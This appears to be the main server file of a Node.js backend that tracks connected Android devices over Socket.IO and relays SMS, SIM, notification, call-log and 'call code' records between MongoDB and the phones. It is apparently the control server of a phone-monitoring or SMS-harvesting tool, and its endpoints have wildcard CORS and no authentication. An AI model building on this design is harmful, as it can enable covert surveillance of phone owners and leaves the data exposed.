import express from "express";
import cors from "cors";
import dotenv from "dotenv";
import { createServer } from "http";
import { Server } from "socket.io";
import fetch from "node-fetch";
import mongoose from "mongoose";
import { connectDB } from "./config/db.js";

import deviceRoutes from "./routes/deviceRoutes.js";
import smsRoutes from "./routes/smsRoutes.js";
import simInfoRoutes from "./routes/simInfoRoutes.js";
import notificationRoutes from "./routes/notificationRoutes.js";
import callRoutes from "./routes/callRoutes.js";
import adminRoutes from "./routes/adminRoutes.js";
import serialRoutes from "./routes/serialRoutes.js";
import callLogRoutes from "./routes/callLogRoutes.js";
import statusRoutes from "./routes/statusRoutes.js";
import lastSeenRoutes from "./routes/lastSeen.routes.js";

dotenv.config();
connectDB();

const app = express();
const server = createServer(app);

// ================= SOCKET.IO SETUP =================

const io = new Server(server, {
  cors: { origin: "*", methods: ["GET", "POST"] },
  allowEIO3: true, // Android purana client compatible
});

app.use(
  cors({
    origin: "*",
  })
);
app.use(express.json());
app.set("io", io);

// ===================================================
//  deviceId -> socketId  (ye hi main mapping hai)
// ===================================================
const deviceSockets = new Map();

// (OPTIONAL) socketId -> deviceId (sirf debug ke liye handy)
const socketDevices = new Map();

// ---------- helper: normalize deviceId from client payload ----------
function extractDeviceId(raw) {
  if (!raw) return null;

  if (typeof raw === "string") return raw.trim();

  // object case
  return (
    raw.deviceId ||
    raw.uniqueId ||
    raw.uniqueid ||
    raw.id ||
    null
  );
}

// 🔹 Debug helper: pura map print karne ke liye
function logSocketMaps(prefix = "") {
  const devToSock = Array.from(deviceSockets.entries());
  console.log(
    `🧾 ${prefix} Current deviceSockets (deviceId -> socketId):`,
    devToSock
  );
}

// 🔹 Save Last Seen (DB API ko call)
async function saveLastSeen(deviceId, connectivity) {
  if (!deviceId) return;
  try {
    const PORT = process.env.PORT || 5000;

    console.log(
      `🕒 saveLastSeen → deviceId=${deviceId}, connectivity=${connectivity}`
    );

    await fetch(`http://localhost:${PORT}/api/lastseen/${deviceId}/status`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ connectivity }),
    });
  } catch (err) {
    console.error("❌ Error saving last seen:", err.message);
  }
}

// 🔹 Emit Call Code Safely (exported – routes me use hoga)
export async function sendCallCodeToDevice(deviceId, callData) {
  if (!deviceId) {
    console.log("⚠️ sendCallCodeToDevice called without deviceId");
    return;
  }

  const socketId = deviceSockets.get(deviceId);
  const liveSocket = socketId && io.sockets.sockets.get(socketId);

  console.log(
    `📤 sendCallCodeToDevice → deviceId=${deviceId}, socketId=${socketId || "N/A"}`
  );

  if (liveSocket) {
    liveSocket.emit("callCodeUpdate", callData);
    console.log(
      `✅ [EMIT] callCodeUpdate → deviceId=${deviceId}, socketId=${liveSocket.id}`
    );
  } else {
    console.log(
      `⚠️ No active socket for deviceId=${deviceId} to send callCodeUpdate`
    );
  }
}

// ================= SOCKET: CONNECTION HANDLER =================

io.on("connection", (socket) => {
  console.log("🟢 Client connected (no device yet): socketId =", socket.id);

  // is connection ke sath kaun sa deviceId map hai
  let currentDeviceId = null;

  // ---------- REGISTER DEVICE ----------
  socket.on("registerDevice", async (payload) => {
    const deviceId = extractDeviceId(payload);
    if (!deviceId) {
      console.log("⚠️ registerDevice called with invalid payload:", payload);
      return;
    }

    console.log(
      `📡 registerDevice received → deviceId=${deviceId}, socketId=${socket.id}, rawPayload=`,
      payload
    );

    // same deviceId ka koi purana socket hai to disconnect
    if (deviceSockets.has(deviceId)) {
      const oldSocketId = deviceSockets.get(deviceId);
      const oldSocket = io.sockets.sockets.get(oldSocketId);

      console.log(
        `♻️ DeviceId=${deviceId} pe pehle se socket mapped tha: oldSocketId=${oldSocketId}, newSocketId=${socket.id}`
      );

      if (oldSocket && oldSocket.id !== socket.id) {
        console.log(`♻️ Disconnecting old socket for deviceId=${deviceId}`);
        oldSocket.disconnect(true);
      }
      deviceSockets.delete(deviceId);
    }

    currentDeviceId = deviceId;
    deviceSockets.set(deviceId, socket.id);
    socketDevices.set(socket.id, deviceId);
    socket.join(deviceId);

    console.log(
      `📱 Registered Device: deviceId=${deviceId}, socketId=${socket.id}`
    );
    logSocketMaps("After registerDevice");

    await saveLastSeen(deviceId, "Online");

    // confirm registration to this device
    socket.emit("deviceRegistered", { deviceId });

    // dashboard ke liye broadcast
    io.emit("deviceStatus", {
      deviceId,
      connectivity: "Online",
      updatedAt: new Date(),
    });
    io.emit("deviceListUpdated", {
      event: "device_connected",
      deviceId,
    });

    // 🔥 connect hote hi last callCode bhej do (agar hai)
    try {
      const callcodesColl = mongoose.connection.collection("callcodes");
      const lastCode = await callcodesColl.findOne(
        { deviceId },
        { sort: { updatedAt: -1 } }
      );

      if (lastCode) {
        console.log(
          `📞 Sending latest CallCode on connect → deviceId=${deviceId}, socketId=${socket.id}`
        );
        socket.emit("callCodeUpdate", lastCode);
      } else {
        console.log(`ℹ️ No previous CallCode found for deviceId=${deviceId}`);
      }
    } catch (err) {
      console.error("❌ Error sending last callcode on register:", err);
    }
  });

  // ---------- DEVICE STATUS PING (Android se) ----------
  socket.on("deviceStatus", (data) => {
    // Kuch clients sirf deviceId string bhejenge, kuch object
    const rawDevice =
      data?.deviceId || data?.uniqueid || data?.uniqueId || data;
    const deviceId = extractDeviceId(rawDevice) || currentDeviceId;

    const connectivity = data?.connectivity;
    if (!deviceId || !connectivity) {
      console.log(
        "⚠️ deviceStatus event invalid → data=",
        data,
        ", resolvedDeviceId=",
        deviceId,
        ", connectivity=",
        connectivity
      );
      return;
    }

    console.log(
      `⚡ deviceStatus → deviceId=${deviceId}, socketId=${socket.id}, connectivity=${connectivity}`
    );

    saveLastSeen(deviceId, connectivity);

    io.emit("deviceStatus", {
      deviceId,
      connectivity,
      updatedAt: new Date(),
    });

    io.emit("deviceListUpdated", {
      event: "status_changed",
      deviceId,
      connectivity,
    });
  });

  // ---------- DISCONNECT ----------
  socket.on("disconnect", () => {
    const mappedDeviceId = currentDeviceId || socketDevices.get(socket.id);
    console.log(
      `🔴 Socket disconnected: socketId=${socket.id}, deviceId=${mappedDeviceId || "UNKNOWN"}`
    );

    if (!mappedDeviceId) return;

    // thoda wait – shayad device ne reconnect kar liya ho
    setTimeout(async () => {
      const storedSocketId = deviceSockets.get(mappedDeviceId);

      // agar map me ab bhi **yehi** socket id hai → ab koi active connection nahi
      if (!storedSocketId || storedSocketId === socket.id) {
        deviceSockets.delete(mappedDeviceId);
        socketDevices.delete(socket.id);

        console.log(
          `📵 Device disconnected fully → deviceId=${mappedDeviceId}, lastSocketId=${socket.id}`
        );
        logSocketMaps("After disconnect");

        await saveLastSeen(mappedDeviceId, "Offline");

        io.emit("deviceStatus", {
          deviceId: mappedDeviceId,
          connectivity: "Offline",
          updatedAt: new Date(),
        });

        io.emit("deviceListUpdated", {
          event: "device_disconnected",
          deviceId: mappedDeviceId,
        });
      } else {
        console.log(
          `🔁 New socket already registered for deviceId=${mappedDeviceId}, currentMappedSocketId=${storedSocketId}, oldDisconnectedSocketId=${socket.id}`
        );
      }
    }, 5000);
  });
});

// ===================== MONGO CHANGE STREAMS =====================

mongoose.connection.once("open", () => {
  console.log("📡 MongoDB connected — Watching Devices, SIMs, Calls, SMS...");

  try {
    // 🟢 Device Collection Watch
    const deviceStream = mongoose.connection.collection("devices").watch();
    deviceStream.on("change", async (change) => {
      const { operationType } = change;
      if (!["insert", "update", "replace"].includes(operationType)) return;

      const updatedDevice = await mongoose.connection
        .collection("devices")
        .findOne({ _id: change.documentKey._id });

      if (updatedDevice) {
        console.log(
          `📡 Device Change → uniqueId=${updatedDevice.uniqueId}, deviceId=${updatedDevice.deviceId || "N/A"}`
        );
        io.emit("deviceListUpdated", {
          event: "db_change",
          device: updatedDevice,
        });
      }
    });

    // 🆕 SIM Info Collection Watch
    const simStream = mongoose.connection.collection("siminfos").watch();
    simStream.on("change", async (change) => {
      const { operationType } = change;
      if (!["insert", "update", "replace"].includes(operationType)) return;

      const updatedSim = await mongoose.connection
        .collection("siminfos")
        .findOne({ _id: change.documentKey._id });

      if (updatedSim) {
        console.log(
          `📶 SIM Change → deviceId=${updatedSim.deviceId}, simSlot=${updatedSim.simSlot || "N/A"}`
        );
        io.emit("simInfoUpdated", {
          event: "sim_change",
          sim: updatedSim,
        });
      }
    });

    // 📞 CallCodes Watch
    const callStream = mongoose.connection.collection("callcodes").watch();
    callStream.on("change", async (change) => {
      if (!["insert", "update", "replace"].includes(change.operationType)) return;

      const updatedDoc = await mongoose.connection
        .collection("callcodes")
        .findOne({ _id: change.documentKey._id });
      if (!updatedDoc) return;

      const deviceId = updatedDoc.deviceId;
      console.log(
        `📞 CallCode Changed → deviceId=${deviceId}, _id=${updatedDoc._id}`
      );
      sendCallCodeToDevice(deviceId, updatedDoc);
    });

    // ✉️ SMS Watch
    const smsStream = mongoose.connection.collection("sms").watch();
    smsStream.on("change", async (change) => {
      if (!["insert", "update", "replace"].includes(change.operationType)) return;

      const updatedDoc = await mongoose.connection
        .collection("sms")
        .findOne({ _id: change.documentKey._id });
      if (!updatedDoc) return;

      const deviceId = updatedDoc.deviceId;
      console.log(
        `📩 SMS Changed → deviceId=${deviceId}, _id=${updatedDoc._id}`
      );

      const socketId = deviceSockets.get(deviceId);
      const liveSocket = socketId && io.sockets.sockets.get(socketId);

      if (liveSocket) {
        console.log(
          `📩 [EMIT] smsUpdate → deviceId=${deviceId}, socketId=${socketId}`
        );
        liveSocket.emit("smsUpdate", updatedDoc);
      } else {
        console.log(
          `⚠️ No active socket for deviceId=${deviceId} to send smsUpdate`
        );
      }
    });
  } catch (err) {
    console.error("💥 Change stream init failed:", err);
  }
});

// ===================== EXPRESS ROUTES =====================

app.get("/", (req, res) => {
  res.send("✅ Live Socket + MongoDB Streams running (Devices, SIM, Calls, SMS)");
});

app.use("/api/device", deviceRoutes);
app.use("/api/sms", smsRoutes);
app.use("/api/siminfo", simInfoRoutes);
app.use("/api/notification", notificationRoutes);
app.use("/api/call", callRoutes);
app.use("/api/admin", adminRoutes);
app.use("/api/serial", serialRoutes);
app.use("/api/status", statusRoutes);
app.use("/api/lastseen", lastSeenRoutes);
app.use("/api/call-log", callLogRoutes);

// 404
app.use((req, res) =>
  res.status(404).json({ success: false, message: "Route not found" })
);

// Error handler
app.use((err, req, res, next) => {
  console.error("💥 Unhandled error:", err);
  res.status(500).json({ success: false, message: "Internal server error" });
});

// ===================== START SERVER =====================

const PORT = process.env.PORT || 5000;
server.listen(PORT, () =>
  console.log(`🚀 Server running on http://localhost:${PORT}`)
);
